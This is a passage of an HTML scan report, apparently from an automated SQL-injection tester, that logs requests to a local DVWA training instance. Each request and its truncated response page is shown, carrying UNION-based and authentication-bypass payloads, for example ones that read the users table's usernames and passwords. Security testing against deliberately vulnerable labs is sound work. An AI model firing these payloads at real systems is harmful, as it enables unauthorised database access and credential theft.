+</div><hr><h3>Test ID: UNION_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.024625<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT database(),user()--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:32 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=16
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.072145<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=15
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_HIGH_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.118340<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=14
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: UNION_HIGH_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.165576<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM dvwa.users LIMIT 1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=13
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.211817<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=12
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.258219<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' #&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=11
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.305212<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin'/*&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=10
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.353810<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=9
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.398205<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=8
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_6</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.445723<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' UNION SELECT 'admin','password'--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=7
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_7</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.492151<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=admin' OR '1'='1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=6
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: AUTH_BYPASS_HIGH_8</h3><p><b>Timestamp:</b> 2025-07-18T22:12:33.524560<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR username='admin&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:33 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4493
+Keep-Alive: timeout=5, max=5
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr>
+    </section>
+    
+</body>
+</html>
